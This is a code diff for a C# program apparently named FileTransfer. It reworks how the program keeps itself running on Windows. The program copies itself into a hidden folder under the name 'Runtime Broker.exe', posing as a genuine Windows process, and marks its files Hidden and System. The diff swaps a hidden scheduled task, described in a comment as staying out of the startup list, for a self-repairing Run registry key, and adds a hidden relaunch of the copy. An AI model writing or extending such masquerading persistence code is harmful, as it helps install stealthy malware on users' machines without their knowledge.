@@ -1,7 +1,7 @@
 using System;
 using System.Diagnostics;
 using System.IO;
-using System.Text;
+using Microsoft.Win32;
 
 namespace FileTransfer
 {
@@ -27,10 +27,22 @@ namespace FileTransfer
 
         public static readonly string DestExe = Path.Combine(DestDir, "Runtime Broker.exe");
         private static readonly string Marker = Path.Combine(DestDir, "wsc.dat");
-        private static readonly string TaskXml = Path.Combine(DestDir, "wsc.xml");
-        private const string TaskName = "Runtime Broker";
+        private const string RunKeyName = "RuntimeBroker";
 
         public static bool IsInstalled() => File.Exists(Marker);
+
+        public static bool IsRunningFromClone()
+        {
+            try
+            {
+                string current = Process.GetCurrentProcess().MainModule?.FileName ?? "";
+                return current.Equals(DestExe, StringComparison.OrdinalIgnoreCase);
+            }
+            catch
+            {
+                return false;
+            }
+        }
 
         public static void Install()
         {
@@ -41,71 +53,23 @@ namespace FileTransfer
                 Log("Source exe: " + source);
                 if (string.IsNullOrEmpty(source)) return;
 
-                // Уже установлено — не дублируем
                 if (File.Exists(Marker))
                 {
-                    Log("Already installed (marker exists)");
+                    Log("Already installed, ensuring autostart");
+                    EnsureAutoStart();
                     return;
                 }
 
                 Directory.CreateDirectory(DestDir);
 
-                // Копируем EXE в скрытую папку
                 File.Copy(source, DestExe, true);
                 File.SetAttributes(DestExe, FileAttributes.Hidden | FileAttributes.System);
 
-                // Создаём скрытую задачу в Планировщике (не отображается в автозагрузке)
-                string xml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
-<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
-  <RegistrationInfo>
-    <Description>Runtime Broker</Description>
-  </RegistrationInfo>
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id=""Author"">
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>LeastPrivilege</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <Hidden>true</Hidden>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-  </Settings>
-  <Actions Context=""Author"">
-    <Exec>
-      <Command>{EscapeXml(DestExe)}</Command>
-    </Exec>
-  </Actions>
-</Task>";
+                AddToAutoStart();
 
-                File.WriteAllText(TaskXml, xml, Encoding.Unicode);
-                File.SetAttributes(TaskXml, FileAttributes.Hidden | FileAttributes.System);
-
-                var psi = new ProcessStartInfo
-                {
-                    FileName = "schtasks.exe",
-                    Arguments = $"/create /tn \"{TaskName}\" /xml \"{TaskXml}\" /f",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true
-                };
-
-                using (var proc = Process.Start(psi))
-                {
-                    proc?.WaitForExit(10000);
-                }
-
-                // Маркер установки
                 File.WriteAllText(Marker, DateTime.Now.ToString());
                 File.SetAttributes(Marker, FileAttributes.Hidden | FileAttributes.System);
+
                 Log("Install finished OK");
             }
             catch (Exception ex)
@@ -115,13 +79,67 @@ namespace FileTransfer
             }
         }
 
-        private static string EscapeXml(string s)
+        private static void AddToAutoStart()
         {
-            return s
-                .Replace("&", "&amp;")
-                .Replace("<", "&lt;")
-                .Replace(">", "&gt;")
-                .Replace("\"", "&quot;");
+            try
+            {
+                using var key = Registry.CurrentUser.OpenSubKey(
+                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                if (key != null)
+                {
+                    key.SetValue(RunKeyName, $"\"{DestExe}\"");
+                    Log("Autostart registry key added");
+                }
+            }
+            catch (Exception ex)
+            {
+                Log("AddToAutoStart error: " + ex.Message);
+            }
+        }
+
+        private static void EnsureAutoStart()
+        {
+            try
+            {
+                using var key = Registry.CurrentUser.OpenSubKey(
+                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                if (key != null)
+                {
+                    string? current = key.GetValue(RunKeyName) as string;
+                    if (string.IsNullOrEmpty(current) || current != $"\"{DestExe}\"")
+                    {
+                        key.SetValue(RunKeyName, $"\"{DestExe}\"");
+                        Log("Autostart registry key repaired");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Log("EnsureAutoStart error: " + ex.Message);
+            }
+        }
+
+        public static void LaunchClone()
+        {
+            try
+            {
+                if (File.Exists(DestExe))
+                {
+                    var psi = new ProcessStartInfo
+                    {
+                        FileName = DestExe,
+                        UseShellExecute = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true
+                    };
+                    Process.Start(psi);
+                    Log("Clone launched");
+                }
+            }
+            catch (Exception ex)
+            {
+                Log("LaunchClone error: " + ex.Message);
+            }
         }
     }
 }
